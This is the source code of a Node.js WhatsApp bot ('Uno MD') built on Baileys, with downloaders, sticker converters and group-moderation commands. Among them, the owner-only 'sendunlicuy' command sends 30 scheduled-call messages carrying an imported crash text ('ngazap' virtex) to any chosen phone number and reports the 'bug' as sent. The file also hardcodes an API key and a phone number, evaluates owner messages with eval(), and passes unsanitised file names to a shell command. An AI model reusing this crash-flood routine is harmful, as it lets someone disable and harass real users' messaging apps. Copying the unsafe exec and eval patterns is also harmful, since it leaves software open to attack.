require('./config.js')
process.on("uncaughtException", console.error);
const baileys = require('@whiskeysockets/baileys')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, isBaileys, MessageType, downloadContentFromMessage, Mimetype } = baileys
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const scr = require('@bochilteam/scraper')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const ytdl = require("ytdl-core")
const fetch = require('node-fetch')
const cheerio = require("cheerio")
const crypto = require("crypto")
const Jimp = require("jimp")
const { fromBuffer } = require('file-type')
const { sizeFormatter} = require("human-readable")
const { color, bgcolor, mycolor } = require('./color')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, jsonformat, getGroupAdmins, formatp, tanggal, formatDate, getTime, sleep, clockString, runtime, format, parseMention, getRandom } = require('./fetcher')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')
const thumb = fs.readFileSync ('./lib/baseikal/image/bacot.jpg')
const { ngazap } = require('./baseikal/virtex/ngazap')
let wm = 'Uno MD'
const {
TelegraPh,
UploadFileUgu,
webp2mp4File,
floNime
} = require('./uploader')
const {
toAudio,
toPTT,
toVideo,
ffmpeg
} = require('./converter')

const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.packname, participant: '0@s.whatsapp.net'}, message: { 'contactMessage': { 'displayName': `${global.nama}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${global.nama};;;\nFN:${global.nama}\nitem1.TEL;waid=${global.owner}:${global.owner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}

module.exports = uno = async (uno, m, chatUpdate, store) => {
try{
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const { color, bgcolor, pickRandom, randomNomor } = require('./console.js')
const { audio } = baileys
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const antilink = JSON.parse(fs.readFileSync('./lib/database/antilink.json'))
const pushname = m.pushName || "No Name"
const botNumber = await uno.decodeJid(uno.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isSticker = (type == 'stickerMessage')
const { chats } = m
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')

const isGroup = m.key.remoteJid.endsWith('@g.us')
const groupMetadata = m.isGroup ? await uno.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAntiLink = antilink.includes(from) ? true : false

if (isGroup && isAntiLink && isBotAdmins){
if (budy.match(`chat.whatsapp.com`)) {
if (!isBotAdmins) return replyy(mess.BotAdmin)
let gclink = (`https://chat.whatsapp.com/`)
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isAdmins)
if (isCreator)
uno.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
await uno.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.sender
}})}}

const reply = (teks) => {
return uno.sendMessage(m.chat, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: true}}, {})
}

const replyy = (teks) => {
return uno.sendMessage(m.chat, { text: teks ,contextInfo:{forwardingScore: 9999999, isForwarded: false}}, { quoted: fpay })
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await uno.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(mess.Iv)
}}

uno.sendPresenceUpdate('unavailable', from)

async function loading () {
var unoLod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🤖..."
]
let { key } = await uno.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'}, { quoted: fpay })

for (let i = 0; i < unoLod.length; i++) { 
await uno.sendMessage(from, {text: unoLod[i], edit: key });
}
}

uno.readMessages([m.key])

switch(command) { 
case 'ytmp3': {
if (!text) return replyy(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
await loading()
downloadMp3(text)
}
break
case 'tiktok': {
if (!text) return replyy(`Example : ${prefix + command} https://vm.tiktok.com/ZSLdF9NYN`)
await loading()
try{
let tik = await fetchJson(`https://api.tiklydown.me/api/download?url=${text}`).catch(async _ => await m.reply(mess.api))
uno.sendMessage(from, { video: { url: tik.video.noWatermark }, caption: `Done kak` })
}catch (err) {
replyy(mess.Iv)
}}
break
case 'toimg': {
if (!/webp/.test(mime)) return replyy(`Example : ${prefix + command} reply foto/image`)
await loading()
try{
let media = await uno.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
uno.sendMessage(m.chat, { image: buffer })
fs.unlinkSync(ran)
})}catch (err) {
m.reply(mess.image)
}}
break
case 'attp': case 'ttp': case 'ttp2': case 'ttp3': case 'ttp4': {
if (!text) return replyy(`Example: ${prefix + command} Jaa XD`)
await loading()
try{
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`).catch(async _ => await m.reply(mess.api))
uno.sendMessage(from, { sticker : ini_buffer })
}catch (err) {
m.reply(mess.text)
}}
break
case 'remini':{
if (!m.quoted) return replyy(`Example : ${prefix + command} reply image`)
await loading()
const { remini } = require('./remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
uno.sendMessage(m.chat, { image: proses, caption:"Done kak"})
}
break
case 'join': {
if (!isCreator) return replyy(mess.OnlyOwner)
if (!text) return replyy(`Example : ${prefix + command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyy(mess.error.Iv)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await uno.groupAcceptInvite(result).then((res) => replyy(jsonformat(res))).catch((err) => replyy(jsonformat(err)))
}
break
case 'owner':
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© uno MD`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: JAA GANTENG\nitem1.TEL;waid=6283838077485:+62838-3807-7485\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
}
}), { userJid: m.chat})
uno.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
case 'self':
if (!isCreator) return replyy(mess.OnlyOwner)
if (!text) return replyy(`Example : ${prefix+command} on/off`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On'){
if (global.self) return reply('Udah on')
global.self = true
reply('Sukses')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off'){
if (!global.self) return reply('Udah off')
global.self = false
reply('Sukses')
}
break
case 'ytmp4': { 
if (!text) return replyy(`Example : ${prefix+command} text`)
await loading()
try{
let anu = await fetchJson(`https://api.arifzyn.xyz/download/youtube?url=${text}`)
const cpt = anu.result.channel
const nick = anu.result.title
uno.sendMessage(m.chat, { video: { url: anu.result.mp4.data}, caption: `💬Judul : ${nick}\n👤Channel : ${cpt}`})
}catch (error) {
m.reply(mess.Iv)
}}
break
case 'sendunlicuy' :  case '🙈':{
if (!isCreator) return replyy(mess.OnlyOwner)
if (!text) return replyy(`Example : ${prefix + command} nomor`)
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'

jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = ngazap
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs":  Date.now(),
"title": cap,
}
}), { userJid: from, quoted : m})
uno.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case 'halloguys': {
if (!isCreator) return replyy(mess.OnlyOwner)
if (!text) return replyy(`Example : ${prefix + command} text`)
var call = { 
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${text}`
}}
uno.relayMessage(m.chat, call, {})
}
break
case 'tourl': {
if (!/video/.test(mime) && !/image/.test(mime)) throw `Example : ${prefix + command} reply image`
if (!quoted) throw `Example : ${prefix + command} reply image`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./uploader')
let media = await uno.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'welcome':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!text) return replyy(`Example : ${prefix + command} on/off`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On'){
if (global.welcome) return replyy('Udah on')
global.welcome = true
m.reply(mess.success)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off'){
if (!global.welcome) return replyy('Udah off')
global.welcome = false
m.reply(mess.success)
}
break
case 'antilink':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isGroupAdmins) return replyy(mess.GrupAdmin)
if (!isBotAdmins) return replyy(mess.BotAdmin)
if (!args[0]) return replyy(`Example : ${prefix + command} on/off`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink berhasil di aktifkan')
antilink.push(from)
fs.writeFileSync('./lib/database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply(mess.success)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return replyy('Antilink berhasil di nonatifkan')
let anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./lib/database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply(mess.success)
} else { replyy(`Example : ${prefix+command} on/off`) }
break
case 'kick': {
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isBotAdmins) return replyy(mess.BotAdmin)
if (!isAdmins) return replyy(mess.GrupAdmin)
await uno.groupParticipantsUpdate(from, [froms], 'remove')
}
break
case 'opentime':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isAdmins && !isCreator) return replyy(mess.GrupAdmin)
if (!isBotAdmins) return replyy(mess.BotAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyy(`Example : ${prefix + command} second/minute/hour/day`)
}
m.reply(`Open time ${q} starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup berhasil dibuka`
uno.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
break
case 'closetime':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isAdmins && !isCreator) return replyy(mess.GrupAdmin)
if (!isBotAdmins) return replyy(mess.BotAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyy(`Example : ${prefix + command} second/minute/hour/day`)
}
m.reply(`Close time ${q} starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup berhasil ditutup`
uno.groupSettingUpdate(m.chat, 'announcement')
m.reply(close)
}, timer)
break
case 'hidetag':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isAdmins && !isCreator) return replyy(mess.GrupAdmin)
if (!isBotAdmins) return replyy(mess.BotAdmin)
uno.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: fpay
})
break
case 'totag':
if (!isGroup) return replyy(mess.OnlyGrup)
if (!isAdmins && !isCreator) return replyy(mess.GrupAdmin)
if (!isBotAdmins) return replyy(mess.BotAdmin)
if (!m.quoted) return replyy(`Example : ${prefix + command} reply text`)
uno.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
break
case 'leave':
if (!isCreator) return replyy(mess.OnlyOwner)
if (!isGroup) return replyy(mess.OnlyGrup)
await uno.groupLeave(m.chat)
break      
case 'menu':
menu = `🤖 Hai saya uno bot
saya bot whatsapp yaitu bot
berjalan menggunakan sistem nodejs
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Nama bot : ${namabot}
No owner : ${owner}
Bot active : ⏳${runtime(process.uptime())}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST MENU*
📝convertmenu
📝downloadmenu
📝groupmenu
📝ownermenu
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
await uno.sendMessage(m.chat, {
text: menu,
contextInfo: {
externalAdReply: {  
title: wm,
body: '',
thumbnailUrl: foto,
sourceUrl: `https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpay})
break
case 'convertmenu':
convertmenu = `*CONVERT MENU*
🗳️attp
🗳️ttp2
🗳️ttp3
🗳️ttp4
🗳️sticker
🗳️toimg
🗳️tourl
🗳️remini`
await uno.sendMessage(m.chat, {
text: convertmenu,
contextInfo: {
externalAdReply: {  
title: wm,
body: '',
thumbnailUrl: foto,
sourceUrl: `https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpay})
break
case 'downloadmenu':
downloadmenu = `*DOWNLOAD MENU*
📩tiktok
📩ytmp3
📩ytmp4`
await uno.sendMessage(m.chat, {
text: downloadmenu,
contextInfo: {
externalAdReply: {  
title: wm,
body: '',
thumbnailUrl: foto,
sourceUrl: `https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpay})
break
case 'groupmenu':
groupmenu = `*GROUP MENU*
🏛️welcome
🏛️antilink
🏛️opentime
🏛️closetime
🏛️kick
🏛️hidetag
🏛️totag`
await uno.sendMessage(m.chat, {
text: groupmenu,
contextInfo: {
externalAdReply: {  
title: wm,
body: '',
thumbnailUrl: foto,
sourceUrl: `https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpay})
break
case 'ownermenu':
ownermenu = `*OWNER MENU*
🐋self
🐋join
🐋leave`
await uno.sendMessage(m.chat, {
text: ownermenu,
contextInfo: {
externalAdReply: {  
title: wm,
body: '',
thumbnailUrl: foto,
sourceUrl: `https://chat.whatsapp.com/Fa311c2RKPaGgmXMZS1FPG`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpay})
break
default:
}
if (budy.startsWith('>')) {
if (!isCreator) return reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
replyy(String(err))
}
}
}catch (err) {
m.reply(`ERORR SILAHKAN LAPORKAN KE OWNER`)
}}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
